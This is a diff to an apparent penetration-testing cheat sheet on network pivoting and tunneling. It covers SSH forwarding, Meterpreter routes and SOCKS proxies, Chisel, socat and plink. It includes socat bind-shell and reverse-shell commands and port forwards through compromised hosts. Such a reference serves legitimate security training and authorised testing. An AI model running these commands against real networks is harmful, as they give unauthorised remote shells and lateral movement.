@@ -27,7 +27,7 @@ Local port --&gt; Compromised host \(SSH\) --&gt; Third\_box:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
 #Example
-sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised> 
+sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 
 ### Port2hostnet \(proxychains\)
@@ -88,8 +88,8 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 
 ```bash
 background# meterpreter session
-route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 2552.55.255.0 8)
-use auxiliary/server/socks4a
+route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
+use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
@@ -98,13 +98,15 @@ Another way:
 
 ```bash
 background #meterpreter session
-use post/windows/manage/autoroute
+use post/multi/manage/autoroute
 set SESSION <session_n>
 set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
 set NETMASK <Netmask>
 run
-use auxiliary/server/socks4a
+use auxiliary/server/socks_proxy
+set VERSION 4a
 run #Proxy port 1080 by default
+echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 
 ## reGeorg
@@ -115,6 +117,26 @@ You need to upload a web file tunnel: ashx\|aspx\|js\|jsp\|php\|php\|jsp
 
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
+```
+
+## Chisel
+
+You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)  
+You need to use the **same version for client and server**
+
+### socks
+
+```bash
+./chisel server -p 8080 --reverse #Server
+./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
+#And now you can use proxychains with port 1080 (default)
+```
+
+### Port forwarding
+
+```bash
+./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
+./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
 ```
 
 ## Rpivot
@@ -150,7 +172,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
-attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337 
+attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
 
 ### Reverse shell
@@ -163,7 +185,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ### Port2Port
 
 ```bash
-socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>,<rport> &
+socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
 ```
 
 ### Port2Port through socks
@@ -192,7 +214,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-###  SSL Socat Tunnel
+### SSL Socat Tunnel
 
 **/bin/sh console**
 
@@ -229,8 +251,8 @@ It's like a console PuTTY version \( the options are very similar to a ssh clien
 As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:
 
 ```bash
-plink.exe -l <Our_valid_username> -pw <valid_password> -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
-plink.exe -l root -pw password -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
+echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
+echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
 ```
 
 ## NTLM proxy bypass
@@ -246,7 +268,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
- It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
+It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
 Example that forward port 443
 
 ```text
@@ -327,4 +349,5 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
